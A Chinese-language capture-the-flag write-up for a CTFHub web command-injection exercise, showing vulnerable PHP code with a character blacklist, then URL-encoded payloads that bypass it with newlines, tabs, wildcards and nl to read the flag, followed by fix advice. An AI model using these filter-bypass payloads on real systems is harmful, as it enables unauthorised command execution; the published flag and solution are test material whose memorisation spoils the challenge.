CTFHub - Web - 命令注入-综合练习

# CTFHub # Web # RCE # 命令注入 # 黑名单绕过

一、题目信息

  • 题目名称：命令注入-综合练习
  • 题目方向：Web - RCE
  • 运行环境：PHP 5.6 + Linux
  • 题目目标：绕过服务端的组合黑名单，执行任意系统命令并读取动态 Flag 文件。

二、漏洞分析

页面直接公开 PHP 源码。用户输入的 ip 未经过类型校验，就被拼接到 ping 命令中，并由 exec() 执行：

<?php
$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];

    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>

服务端过滤了命令分隔符 |、&、;，空格，目录分隔符 /，以及字符串 cat、flag、ctfhub。过滤规则仍可组合绕过：

被过滤内容绕过方式
命令分隔符使用换行符 %0a 分隔命令。
空格使用制表符 %09 作为参数分隔符。
目录分隔符 /使用 cd 与通配符进入目录，避免提交绝对路径。
关键字 cat、flag使用 nl 读取文件，使用 ????_??_???? 通配目录名。

三、解题步骤

  1. 验证命令执行： 
    ip=127.0.0.1%0aid

    换行符结束原始 ping 命令并执行 id，回显确认当前权限为 www-data。

    uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
  2. 列出当前目录： 
    ip=127.0.0.1%0als%09-la

    %09 解码后为制表符，可替代被过滤的空格。当前目录下发现动态目录 flag_is_here。

    drwxr-xr-x    2 root     root          4096 Sep 23 12:10 flag_is_here
-rw-r--r--    1 root     root           685 Feb 20  2020 index.php
  3. 使用通配符进入目标目录： 
    ip=127.0.0.1%0acd%09????_??_????%0als%09-la

    ????_??_???? 匹配 flag_is_here，整个 payload 不包含被过滤的 flag 和 /。目录中的文件名按环境动态生成：

    flag_274393146829609.php
  4. 使用 nl 读取 Flag： 
    ip=127.0.0.1%0acd%09????_??_????%0anl%09*

    nl * 输出当前目录下所有文件内容，避免使用被过滤的 cat。

         1	<?php // ctfhub{42d3877332b12c6564cc0509}

四、最终 Flag

ctfhub{42d3877332b12c6564cc0509}

实际环境中的文件名和 Flag 会动态生成，复现时应以当前响应结果为准。

五、修复建议

  • 严格校验输入：使用 filter_var($ip, FILTER_VALIDATE_IP) 校验目标地址，拒绝所有 shell 元字符和路径内容。
  • 禁止拼接 Shell 命令：使用参数分离的命令执行 API，或对每个参数调用 escapeshellarg()。
  • 不要依赖字符黑名单：换行、制表符、通配符和命令别名都可能绕过过滤，输入校验应采用严格白名单。
  • 最小化权限：降低 Web 服务账户权限，并将 Flag 等敏感文件移出 Web 根目录及可读范围。
